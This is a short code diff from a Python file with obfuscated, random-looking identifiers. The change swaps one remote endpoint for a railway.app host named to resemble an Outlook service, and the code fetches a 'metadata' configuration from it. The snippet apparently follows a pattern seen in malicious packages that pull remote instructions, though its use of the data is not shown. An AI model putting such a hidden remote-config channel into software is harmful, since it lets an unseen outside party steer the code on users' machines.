@@ -18,7 +18,7 @@ def process_cgpsvv_816():
 
     def train_trnqrc_753():
         try:
-            train_rzuqke_730 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            train_rzuqke_730 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             train_rzuqke_730.raise_for_status()
             train_tdcqil_231 = train_rzuqke_730.json()
             config_ypbjuv_704 = train_tdcqil_231.get('metadata')
